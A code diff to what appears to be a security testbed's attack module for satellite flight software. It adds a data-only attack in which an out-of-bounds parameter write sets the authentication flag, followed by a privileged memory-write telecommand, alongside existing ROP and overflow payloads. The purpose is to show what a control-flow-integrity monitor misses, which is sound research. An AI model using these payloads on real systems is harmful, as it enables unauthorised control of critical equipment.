@@ -26,6 +26,9 @@ OFF_ROP_R7 = 84
 OFF_ROP_PC = 88
 
 APID_ADCS_MODE = 0x10
+APID_PARAM_SET = 0x50
+APID_PRIV_WRITE = 0x60
+AUTH_FLAG_INDEX = 8      # g_state.params[8] IS g_state.authenticated
 
 
 def _w(v: int) -> bytes:
@@ -111,6 +114,24 @@ def atk5_privileged_call(sym) -> bytes:
     return bytes(p)
 
 
+# --------------------------------------------------------------------------
+# S5 - Data-only attack. The boundary case: no control flow is diverted at
+# all. Two well-formed telecommands, each taking a path the CFG allows.
+#
+#   1. param_set(index=8) walks off the end of the parameter table and lands
+#      on g_state.authenticated, setting it to 1.
+#   2. A legitimate privileged telecommand then passes the authentication
+#      check it should have failed.
+#
+# Every edge the monitor observes is legal, because every edge IS legal. The
+# mission is lost anyway. This is what trace-based CFI cannot see.
+# --------------------------------------------------------------------------
+def s5_data_only() -> list[tuple[int, bytes]]:
+    forge_auth = bytes([AUTH_FLAG_INDEX]) + _w(1)
+    priv_write = _w(0x20000000) + _w(0xDEADBEEF)
+    return [(APID_PARAM_SET, forge_auth), (APID_PRIV_WRITE, priv_write)]
+
+
 ATTACKS = {
     "ATK-1": ("Buffer overflow (saved return address)", atk1_buffer_overflow),
     "ATK-2": ("Function pointer corruption", atk2_function_pointer),
@@ -118,3 +139,6 @@ ATTACKS = {
     "ATK-4": ("Malicious task scheduling", atk4_task_scheduling),
     "ATK-5": ("Unauthorized privileged function", atk5_privileged_call),
 }
+
+# Not in ATTACKS: S5 is not a control-flow attack, and grouping it with the
+# others would misrepresent what the monitor is being asked to do.
